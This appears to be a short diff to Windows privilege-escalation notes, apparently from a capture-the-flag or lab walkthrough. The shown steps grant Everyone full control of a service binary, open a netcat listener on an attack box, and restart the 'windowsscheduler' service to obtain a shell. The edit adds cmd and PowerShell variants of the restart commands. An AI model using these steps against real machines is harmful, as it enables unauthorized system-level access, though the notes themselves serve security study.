@@ -145,8 +145,10 @@ icacls C:\PROGRA~2\SYSTEM~1\WService.exe /grant Everyone:F
 7️⃣ # Launch Lenner on the attackbox
 nc -lvp 4445
 8️⃣ # start service and get access:
-sc stop windowsscheduler
-sc start windowsscheduler
+sc stop windowsscheduler # cmd
+sc start windowsscheduler # cmd
+sc.exe stop windowsscheduler # powershell
+sc.exe start windowsscheduler # powershell
 ----------------------------------------------------------------
 # Check services through the Windows Registry
 
